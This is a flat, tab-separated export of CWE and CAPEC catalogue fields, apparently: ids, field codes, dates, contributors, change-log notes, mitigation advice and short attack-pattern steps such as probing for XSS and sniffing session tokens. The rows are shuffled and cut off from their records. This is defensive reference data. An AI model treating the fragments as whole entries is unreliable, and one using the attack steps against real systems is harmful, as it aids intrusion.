13818	76	2019-04-04
8746	56	ChildOf
20133	62	updated Common_Consequences, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
9885	91	Implementation
21244	28	CWE Content Team
16914	39	2012-05-11
24089	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
20239	62	updated Type
20597	28	CWE Content Team
6123	57	Primary
16815	55	CAPEC Content Team
8221	69	Incomplete
15667	35	MITRE
9820	26	Architecture and Design
16157	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
8736	28	CWE Content Team
11813	44	SOAR Partial
5588	97	SoundSquatting
22588	104	789
8347	62	updated Potential_Mitigations, Time_of_Introduction
24248	39	2011-03-29
6838	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
23163	43	Simple
21247	39	2008-09-08
9109	81	Integrity
14649	39	2012-10-30
15403	62	updated Time_of_Introduction
21522	91	Implementation
18634	35	MITRE
7463	28	CWE Content Team
25109	35	MITRE
20103	79	Integrity
16589	97	Query System for Information
11855	28	CWE Content Team
8079	62	updated Modes_of_Introduction, Relationships
10369	39	2019-01-03
25123	78	Medium
20244	39	2012-05-11
25058	39	2017-11-08
25065	62	updated Potential_Mitigations
19665	46	This issue can prevent the software from running reliably, e.g. due to undefined behavior.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
7435	28	CWE Content Team
13385	62	updated Relationships, Taxonomy_Mappings
10433	28	CWE Content Team
13160	62	updated Relationships, Taxonomy_Mappings
22933	31	1000
7668	95	[Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase
17831	35	MITRE
18898	95	[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.
14755	72	It is possible to overflow the number of temporary files because directories typically have limits on the number of files allowed. This could create a denial of service problem.
19479	81	Integrity
19662	48	11
24221	35	MITRE
19320	88	Collapse of Data into Unsafe Value
22039	47	Execute Unauthorized Commands
11610	72	In PHP, regular expression checks can sometimes be bypassed with a null byte, leading to any number of weaknesses.
20539	55	CAPEC Content Team
20993	62	updated Common_Consequences
23044	40	The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.
6245	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
21569	78	High
9266	39	2012-05-11
7333	28	CWE Content Team
24985	103	Primary
18291	89	Standard
23818	27	A command line version of traceroute or similar tool that performs route enumeration.
10908	91	Implementation
21743	28	CWE Content Team
7738	73	Spider web sites for all available links
15436	103	Primary
12883	91	Architecture and Design
5933	55	CAPEC Content Team
19062	76	2017-05-01
20543	101	CAPEC Content Team
10948	97	Influence Perception of Scarcity
11514	40	Access to the download and update system(s) used to deliver BIOS images.
23728	35	MITRE
23755	102	ChildOf
6318	76	2015-11-09
11244	39	2008-10-14
24270	31	699
19805	28	CWE Content Team
23549	88	Process Control
14660	31	1000
22647	74	4
18276	28	CWE Content Team
23460	39	2011-06-27
19847	28	CWE Content Team
24215	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7600	62	updated Relationships
7316	59	Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required
23672	62	added/updated demonstrative examples
20035	59	Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)
6612	92	Explore
22263	62	updated Potential_Mitigations, Time_of_Introduction
9940	89	Standard
5613	102	ChildOf
20671	35	MITRE
11019	35	MITRE
24128	42	Do not use JNI calls if you don't trust the native library.
12728	95	[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.
23708	88	Use of a Non-reentrant Function in a Concurrent Context
21686	56	ChildOf
12991	62	updated Time_of_Introduction
7960	28	CWE Content Team
8335	35	MITRE
15852	39	2008-07-01
11346	35	MITRE
19659	39	2011-06-01
6830	39	2009-01-12
11531	72	If a control character, such as NULL is removed, one may cause resource access control problems.
23972	62	updated Relationships, Taxonomy_Mappings
21054	103	Primary
10361	62	updated Related_Attack_Patterns
17592	24	MITRE
11359	39	2018-03-27
25014	73	The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using "sleep(2)" and "usleep()" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.
9860	100	The MITRE Corporation
20936	39	2014-06-23
23211	62	updated Description, Other_Notes
10369	62	updated Relationships, Taxonomy_Mappings
17408	91	Architecture and Design
15084	46	Developers often choose default values that leave the software as open and easy to use as possible out-of-the-box, under the assumption that the administrator can (or should) change the default value.  However, this ease-of-use comes at a cost when the default is insecure and the administrator does not change it.
8597	39	2017-01-19
25330	28	CWE Content Team
19650	45	Variant
17162	84	20
7356	71	2011
22385	59	Updated Related_Attack_Patterns
19400	76	2018-07-31
18156	35	MITRE
21284	79	Access Control
25142	62	updated Common_Consequences
21868	31	699
7318	35	MITRE
5664	62	updated Relationships, Taxonomy_Mappings
7164	73	Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.
15502	91	Architecture and Design
19484	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
10473	28	CWE Content Team
17155	35	MITRE
20430	62	updated Other_Notes
9168	35	Cigital
15913	63	Modify Application Data
8237	63	DoS: Resource Consumption (CPU)
17645	62	added/updated white box definitions
11172	23	An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.
10164	62	updated Description
13839	73	List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.
9991	103	Primary
6884	69	Incomplete
18751	62	added/updated white box definitions
23055	95	[Spider] Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.
12302	35	MITRE
10201	23	The software implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.
22860	73	Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.
6472	43	Simple
7730	101	CAPEC Content Team
10915	39	2008-07-01
15032	39	2009-10-29
5651	103	Primary
10857	104	328
23103	39	2012-10-30
17065	35	MITRE
18581	51	2014-06-23
14780	52	Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.                   Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.
19374	56	ChildOf
18767	21	PLOVER
16191	39	2012-10-30
19546	91	Implementation
17365	39	2009-05-27
24175	35	MITRE
8504	39	2008-11-24
20067	39	2011-03-29
20402	74	3
21015	28	CWE Content Team
16279	26	Operation
8551	26	Implementation
15911	62	updated Common_Consequences, Demonstrative_Examples, Description, Maintenance_Notes, Name, Other_Notes, Potential_Mitigations, References, Relationships
14818	35	MITRE
15815	47	Hide Activities
16720	91	Implementation
19257	28	CWE Content Team
11121	55	CAPEC Content Team
25062	102	ChildOf
12116	39	2017-05-03
7542	40	Advanced knowledge about the ASIC installed within the target system.
22041	62	updated Common_Consequences
12011	35	MITRE
5927	70	MD5 Considered Harmful Today: Creating a Rogue CA Certificate
12680	42	If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path.
12567	27	The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.
13150	72	The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers.
18620	39	2012-05-11
21972	31	1000
21290	79	Access Control
13704	39	2010-04-05
19968	104	224
17643	28	CWE Content Team
12548	28	CWE Content Team
16822	97	TCP Fragmentation
10897	35	MITRE
8578	101	CAPEC Content Team
22808	62	updated Abstraction
17703	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
10750	35	MITRE
20917	81	Confidentiality
16570	26	Implementation
15038	62	updated Potential_Mitigations
23515	47	Hide Activities
7677	63	Bypass Protection Mechanism
8343	35	MITRE
11748	32	The Web Application Security Consortium (WASC)
18025	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies                            Generated Code Inspection
7313	39	2008-09-08
24178	39	2010-06-21
20237	39	2019-01-03
24733	28	CWE Content Team
18137	97	Using Meta-characters in E-mail Headers to Inject Malicious Payloads
19021	90	C
10965	39	2008-09-08
13998	43	Simple
10719	62	updated Relationships, Taxonomy_Mappings
7122	21	PLOVER
6066	79	Access Control
17251	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
20508	28	CWE Content Team
16753	40	The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.
10194	103	Primary
25227	21	PLOVER
16089	28	CWE Content Team
12065	23	The software does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results.
8329	104	529
25004	43	Simple
20000	35	MITRE
19775	28	CWE Content Team
6292	63	Unexpected State
6382	31	1000
20069	49	2009
17818	62	updated Potential_Mitigations
25380	28	CWE Content Team
16407	63	DoS: Resource Consumption (CPU)
14197	35	MITRE
11091	88	Improper Following of Specification by Caller
14237	101	CAPEC Content Team
17763	28	CWE Content Team
8108	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.                   Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.
12280	55	CAPEC Content Team
23682	88	Server-Side Request Forgery (SSRF)
12513	31	1000
7091	96	2009-03-03
10054	39	2012-05-11
23192	63	DoS: Crash, Exit, or Restart
6172	93	Defense in Depth
19496	62	added/updated white box definitions
19344	28	CWE Content Team
19522	49	2011
7164	95	[Survey the application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.
22668	28	CWE Content Team
22781	35	MITRE
20521	28	CWE Content Team
22753	62	updated Time_of_Introduction
19415	62	updated Description, Enabling_Factors_for_Exploitation, Functional_Areas, Observed_Examples, Other_Notes, Potential_Mitigations, Relationship_Notes, Weakness_Ordinalities
23596	39	2019-01-03
13951	39	2013-02-21
25019	39	2012-05-11
8937	81	Other
18085	81	Integrity
24940	104	362
12658	53	The MITRE Corporation
5928	74	1
15802	28	CWE Content Team
20526	79	Confidentiality
11909	21	CLASP
21651	62	updated Relationships
22310	80	Cryptanalysis of signature verification algorithm
8804	39	2008-07-01
19169	39	2017-05-03
14195	21	CWE Content Team
8728	44	Moderate
20786	46	An attacker can often obtain data from a GUI, even if hidden, by using an API to directly access GUI objects such as windows and menus. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
6501	28	CWE Content Team
22531	77	Automated Static Analysis - Binary or Bytecode
20957	35	Cigital
24633	39	2018-03-27
22084	46	It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.             This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.
20470	88	Incorrect Permission Assignment for Critical Resource
8584	59	Updated Resources_Required
15958	69	Incomplete
18333	56	ChildOf
16750	56	ChildOf
8041	31	1000
12921	79	Availability
19140	95	[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout
8836	91	Implementation
12142	91	Implementation
11867	35	MITRE
15111	35	MITRE
24410	62	updated Relationships
7989	74	4
14935	30	Luca Carettoni
24583	28	CWE Content Team
7733	31	699
24017	35	MITRE
7280	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
21204	88	Use of Password System for Primary Authentication
7891	31	1000
16450	28	CWE Content Team
6259	35	MITRE
9453	31	699
23203	35	MITRE
22795	63	Alter Execution Logic
7784	62	updated Time_of_Introduction
16789	85	198
24237	28	CWE Content Team
5632	28	CWE Content Team
23110	35	MITRE
21888	59	Updated Related_Attack_Patterns
6495	51	2015-11-09
13112	62	updated Relationship_Notes
11970	99	ECU Publications
15827	46	When changing platforms or protocol versions, in-memory organization of data may change in unintended ways. For example, some architectures may place local variables A and B right next to each other with A on top; some may place them next to each other with B on top; and others may add some padding to each. The padding size may vary to ensure that each variable is aligned to a proper word size.             In protocol implementations, it is common to calculate an offset relative to another field to pick out a specific piece of data. Exceptional conditions, often involving new protocol versions, may add corner cases that change the data layout in an unusual way. The result can be that an implementation accesses an unintended field in the packet, treating data of one type as data of another type.
18629	103	Primary
6659	56	ChildOf
24622	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
5789	28	Eric Dalci
6235	101	CAPEC Content Team
21912	62	updated Potential_Mitigations
19046	39	2012-10-30
24541	100	The MITRE Corporation
8598	66	Resource exhaustion
24707	47	Modify Data
19487	56	ChildOf
6152	39	2019-01-03
24670	28	CWE Content Team
9575	28	CWE Content Team
20104	39	2009-07-27
16228	22	12
12758	46	This can include space, tab, etc.
14384	79	Non-Repudiation
22016	59	Updated Attack_Prerequisites, Description Summary
14831	76	2019-04-04
25126	81	Access Control
8442	35	MITRE
11782	81	Integrity
10042	45	Variant
5882	47	Gain Privileges
12933	36	http://en.wikipedia.org/wiki/Race_condition
14646	26	Architecture and Design
13349	104	34
22223	62	updated Potential_Mitigations
24911	90	PHP
11506	66	Separation of Privilege
15154	28	CWE Content Team
8936	28	CWE Content Team
8849	62	updated Description, Name, Relationships
19072	59	Updated Related_Attack_Patterns
19447	81	Integrity
24074	35	MITRE
13059	35	MITRE
9880	62	updated Time_of_Introduction
5956	62	updated Description, Other_Notes
17203	28	CWE Content Team
22517	103	Primary
17049	43	Simple
6403	39	2012-05-11
24324	91	Architecture and Design
15367	62	updated Relationships
9126	103	Primary
16535	100	The MITRE Corporation
22969	39	2008-11-24
6417	62	updated Taxonomy_Mappings
14071	91	Testing
19001	35	Cigital
19049	81	Integrity
20461	39	2019-06-20
6563	28	CWE Content Team
6305	62	updated Description, Name
8617	33	Kevin Beaver
10881	62	updated Common_Consequences
18302	60	05
13271	66	XML Denial of Service Attacks and Defenses
12515	35	MITRE
10476	32	Trend Micro
21700	39	2011-06-27
7281	39	2008-09-08
6820	28	CWE Content Team
12156	56	ChildOf
18494	39	2008-09-08
16328	28	CWE Content Team
23743	31	1000
11750	85	438
5881	35	MITRE
24300	95	[Determine username(s) to target] Determine username(s) whose passwords to crack.
25288	90	C
16027	56	ChildOf
9007	28	Eric Dalci
15745	89	Standard
10421	56	ChildOf
11911	51	2014-06-23
19271	43	Simple
13020	28	CWE Content Team
16368	35	MITRE
8075	33	John Stewart
24328	25	Medium
9549	31	1000
14504	39	2015-12-07
17667	35	Cigital
14974	48	12
19596	62	updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction
14941	62	updated Common_Consequences, Relationships
16352	39	2014-07-30
16986	39	2011-09-13
25239	35	MITRE
16178	56	ChildOf
24100	21	CWE Content Team
15084	88	Insecure Default Initialization of Resource
24716	103	Primary
8574	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22916	81	Integrity
12439	46	While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers or types of arguments, such as format strings in C. It also can occur in languages or environments that do not enforce strong typing.
11621	35	MITRE
20049	88	Declaration of Throws for Generic Exception
10882	28	CWE Content Team
8634	35	MITRE
6330	91	Architecture and Design
14872	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the incentives that would influence the actions of the specific target.
22453	46	If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.
9640	46	Often, when functions or loops become complicated, some level of resource cleanup is needed throughout execution. Exceptions can disturb the flow of the code and prevent the necessary cleanup from happening.
12861	35	MITRE
24456	62	updated Potential_Mitigations, Time_of_Introduction
16540	71	2009
11517	35	MITRE
15915	28	CWE Content Team
24180	61	Draft
18818	62	updated Alternate_Terms, Observed_Examples, Other_Notes, References, Relationship_Notes, Relationships, Research_Gaps
19457	62	updated Relationships
9346	40	The targeted program does not perform input validation properly.
19885	103	Primary
6498	103	Primary
20843	103	Primary
23958	62	updated Common_Consequences, Relationships
6891	62	updated Description, Other_Notes
21125	62	updated Applicable_Platforms, Causal_Nature
9129	62	updated Relationships
13407	53	The MITRE Corporation
12172	39	2012-10-30
12889	86	http://en.wikipedia.org/wiki/Rainbow_table
19737	76	2017-05-01
19134	26	Implementation
17377	39	2017-05-03
13660	47	Unreliable Execution
22546	62	updated Relationships, Taxonomy_Mappings
20601	28	CWE Content Team
22820	76	2017-08-04
10634	39	2017-11-08
8746	103	Primary
18296	39	2012-05-11
10688	88	Small Space of Random Values
15778	56	PeerOf
24931	76	2019-09-30
6318	100	The MITRE Corporation
6586	28	CWE Content Team
13682	62	updated Demonstrative_Examples, Taxonomy_Mappings
20398	28	CWE Content Team
16271	39	2019-06-20
16602	39	2017-11-08
10681	35	MITRE
21181	89	Detailed
17096	78	High
10308	88	Improper Handling of Structural Elements
20233	35	MITRE
13611	62	updated Potential_Mitigations
14995	62	updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
12598	89	Detailed
6316	31	699
8191	35	MITRE
21595	26	Implementation
23913	56	ChildOf
14756	35	MITRE
13272	62	updated Taxonomy_Mappings
13956	47	Modify Data
18957	39	2011-03-29
15966	39	2008-11-24
7584	39	2008-07-01
12032	96	2009-12-04
23342	39	2017-11-08
7309	35	MITRE
5996	56	ChildOf
23239	50	Change default passwords by choosing strong passwords.
17957	76	2017-01-09
19078	90	Language-Independent
13453	44	SOAR Partial
12551	57	Resultant
8349	76	2019-04-04
7612	85	551
5606	91	Installation
15531	88	Improper Neutralization of Special Elements used in a Command ('Command Injection')
6328	31	1000
9383	73	An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.
11175	28	CWE Content Team
24008	35	MITRE
7702	39	2017-11-08
17735	45	Base
15092	28	CWE Content Team
12224	35	MITRE
12963	88	ASP.NET Misconfiguration: Creating Debug Binary
19866	91	Implementation
21025	62	updated Demonstrative_Examples, References, Relationships
17556	62	updated Relationships, Taxonomy_Mappings
19923	40	The access right to resources are not set properly.
10228	45	Compound
22194	35	MITRE
14630	53	The MITRE Corporation
14362	63	Unexpected State
17358	35	MITRE
18235	74	2
21267	62	updated Potential_Mitigations
11436	100	The MITRE Corporation
17001	39	2015-12-07
5758	21	CWE Content Team
22049	25	Low
15070	25	Low
17753	28	CWE Content Team
7407	53	The MITRE Corporation
15408	28	CWE Content Team
10968	62	updated Applicable_Platforms
12285	102	ChildOf
19005	35	MITRE
18928	39	2019-06-20
15822	28	CWE Content Team
19156	69	Incomplete
8432	23	The software receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.
25042	39	2009-03-10
16310	26	Implementation
20258	30	Gordon "Fyodor" Lyon
15409	70	WASC Threat Classification 2.0
20418	53	The MITRE Corporation
24001	62	updated Relationships, Taxonomy_Mappings
22013	85	400
22346	62	updated Relationships, Taxonomy_Mappings
13381	35	MITRE
15251	39	2017-11-08
13010	63	DoS: Resource Consumption (Other)
6992	103	Primary
9682	88	Missing Reference to Active File Descriptor or Handle
14437	39	2014-07-30
6125	21	7 Pernicious Kingdoms
17754	50	Design: Do not use HTTP verbs as factors in access decisions.
17085	103	Primary
15781	56	Requires
17590	28	CWE Content Team
24180	85	80
13459	35	Cigital
18607	103	Primary
17797	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
18089	35	MITRE
20770	39	2009-12-28
6790	81	Integrity
7796	47	Bypass Protection Mechanism
16162	101	CAPEC Content Team
13037	30	Sean Barnum
8284	42	Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.
16818	92	Explore
22808	28	CWE Content Team
23248	89	Detailed
8745	51	2014-06-23
15774	85	132
10880	91	Architecture and Design
5709	69	Incomplete
22552	28	CWE Content Team
18309	35	MITRE
10045	39	2017-11-08
9508	23	The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways.
8995	89	Detailed
6812	103	Primary
6123	90	Perl
11944	28	CWE Content Team
21360	35	MITRE
24970	30	Roi Saltzman
20517	33	Mark Curphey, Microsoft
19659	28	CWE Content Team
19153	62	updated Relationships
6594	63	Execute Unauthorized Code or Commands
19538	23	The software uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.
5849	35	MITRE
11744	62	updated Demonstrative_Examples, Relationships
8871	35	MITRE
18012	79	Integrity
24731	86	https://en.wikipedia.org/wiki/Computational_complexity_theory
20117	63	Bypass Protection Mechanism
24029	39	2011-06-27
6656	33	Jason Lam
5679	104	437
12959	73	Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.
20811	53	The MITRE Corporation
11834	56	ChildOf
8181	26	Implementation
15263	81	Confidentiality
11523	28	CWE Content Team
14162	35	MITRE
18799	79	Authorization
6841	39	2011-06-01
25397	63	Read Application Data
23450	62	updated Other_Notes
9294	43	Simple
17305	62	updated Common_Consequences
25328	39	2008-07-01
22167	28	CWE Content Team
7828	62	updated Relationships, Taxonomy_Mappings
10026	50	Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.
10441	47	Gain Privileges
17877	46	Race conditions frequently occur in signal handlers, since signal handlers support asynchronous actions. These race conditions have a variety of root causes and symptoms. Attackers may be able to exploit a signal handler race condition to cause the software state to be corrupted, possibly leading to a denial of service or even code execution.             These issues occur when non-reentrant functions, or state-sensitive actions occur in the signal handler, where they may be called at any time. These behaviors can violate assumptions being made by the "regular" code that is interrupted, or by other signal handlers that may also be invoked. If these functions are called at an inopportune moment - such as while a non-reentrant function is already running - memory corruption could occur that may be exploitable for code execution. Another signal race condition commonly found occurs when free is called within a signal handler, resulting in a double free and therefore a write-what-where condition. Even if a given pointer is set to NULL after it has been freed, a race condition still exists between the time the memory was freed and the pointer was set to NULL. This is especially problematic if the same signal handler has been set for more than one signal -- since it means that the signal handler itself may be reentered.             There are several known behaviors related to signal handlers that have received the label of "signal handler race condition":                                                Shared state (e.g. global data or static variables) that are accessible to both a signal handler and "regular" code                   Shared state between a signal handler and other signal handlers                   Use of non-reentrant functionality within a signal handler - which generally implies that shared state is being used. For example, malloc() and free() are non-reentrant because they may use global or static data structures for managing memory, and they are indirectly used by innocent-seeming functions such as syslog(); these functions could be exploited for memory corruption and, possibly, code execution.                   Association of the same signal handler function with multiple signals - which might imply shared state, since the same code and resources are accessed. For example, this can be a source of double-free and use-after-free weaknesses.                   Use of setjmp and longjmp, or other mechanisms that prevent a signal handler from returning control back to the original functionality                   While not technically a race condition, some signal handlers are designed to be called at most once, and being called more than once can introduce security problems, even when there are not any concurrent calls to the signal handler. This can be a source of double-free and use-after-free weaknesses.                                          Signal handler vulnerabilities are often classified based on the absence of a specific protection mechanism, although this style of classification is discouraged in CWE because programmers often have a choice of several different mechanisms for addressing the weakness. Such protection mechanisms may preserve exclusivity of access to the shared resource, and behavioral atomicity for the relevant code:                                                Avoiding shared state                   Using synchronization in the signal handler                   Using synchronization in the regular code                   Disabling or masking other signals, which provides atomicity (which effectively ensures exclusivity)
15195	103	Primary
12753	88	Use of Pointer Subtraction to Determine Size
19007	39	2011-06-27
18972	39	2013-02-21
9347	28	CWE Content Team
23681	63	Reduce Reliability
23627	62	updated Relationships, Taxonomy_Mappings
5927	30	Arjen Lenstra
16889	62	updated Relationships
20991	30	Michael Howard
22393	45	Class
5645	91	Implementation
12369	28	CWE Content Team
7610	28	CWE Content Team
12463	53	The MITRE Corporation
24365	28	CWE Content Team
17382	35	Veracode
23947	39	2017-11-08
21501	88	Unimplemented or Unsupported Feature in UI
9175	35	MITRE
24273	62	updated Common_Consequences
20565	31	699
18687	35	MITRE
15646	39	2017-11-08
13953	39	2014-07-30
10753	69	Incomplete
17669	35	Cigital
17670	93	High
21198	35	MITRE
14874	40	In order to feasibly execute this type of attack, some valuable data must be present in client software.
22657	43	Simple
12767	69	Draft
19368	100	The MITRE Corporation
18954	73	When the name of the Flash file is exposed as a form or a URL parameter, the attacker injects '?' and the payload after the file name in the URL to override some global value.
24034	62	updated Relationships
24301	62	updated Potential_Mitigations
14475	39	2011-03-29
7631	81	Integrity
18114	62	updated Common_Consequences
24700	35	MITRE
23486	35	MITRE
24247	48	12
23125	62	updated Time_of_Introduction
11903	97	Application API Button Hijacking
7044	103	Primary
7885	62	updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
9108	31	1000
18436	91	Testing
7460	56	CanPrecede
6102	81	Other
18125	81	Access Control
15262	88	Expired Pointer Dereference
7482	35	MITRE
12843	35	MITRE
25128	88	Information Exposure
13415	69	Incomplete
24579	35	MITRE
5994	62	updated Relationships
9136	39	2019-01-03
17551	80	This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing, inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them).
23827	42	Understand your programming language's underlying representation and how it interacts with numeric calculation. Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how your language handles numbers that are too large or too small for its underlying representation.
13254	35	Cigital
9087	62	updated Demonstrative_Examples
23366	100	The MITRE Corporation
5993	63	DoS: Crash, Exit, or Restart
19773	56	ChildOf
19775	39	2008-09-08
20681	28	CWE Content Team
12019	23	The software does not properly handle when the expected number of parameters, fields, or arguments is not provided in input, or if those parameters are undefined.
14181	35	MITRE
21573	32	The Wikimedia Foundation, Inc
13169	104	349
13705	53	The MITRE Corporation
18508	73	Use a proxy tool to record results of the created requests.
9123	62	updated Time_of_Introduction
12062	62	updated Description, Name, Related_Attack_Patterns
6248	35	MITRE
14492	63	Gain Privileges or Assume Identity
16604	81	Confidentiality
17401	40	The adversary must be able to control the path that is requested of the target.
14409	39	2011-06-01
19068	28	CWE Content Team
23133	35	MITRE
14308	62	updated Taxonomy_Mappings
13242	39	2010-09-27
6513	45	Variant
6952	45	Variant
